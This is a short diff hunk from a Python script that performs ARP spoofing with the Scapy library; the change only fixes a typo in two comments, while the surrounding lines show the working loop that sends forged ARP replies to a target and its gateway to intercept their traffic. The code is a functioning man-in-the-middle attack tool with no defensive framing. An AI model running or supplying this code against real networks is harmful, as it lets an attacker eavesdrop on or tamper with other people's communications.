@@ -16,10 +16,10 @@ def impersonate(target_ip, spoof_gateway_ip):
     sent_packets_count = 0
 
     while True:
-        # Telling the target that the gateway is not the ip you know, bot It's actually my ip now.
+        # Telling the target that the gateway is not the ip you know, but It's actually my ip now.
         send(ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_gateway_ip), verbose=False)
 
-        # Telling the gateway that the target is not the ip you know, bot It's actually my ip now.
+        # Telling the gateway that the target is not the ip you know, but It's actually my ip now.
         send(ARP(op=2, pdst=spoof_gateway_ip, hwdst=get_mac(spoof_gateway_ip), psrc=target_ip), verbose=False)
 
         sent_packets_count = sent_packets_count + 2
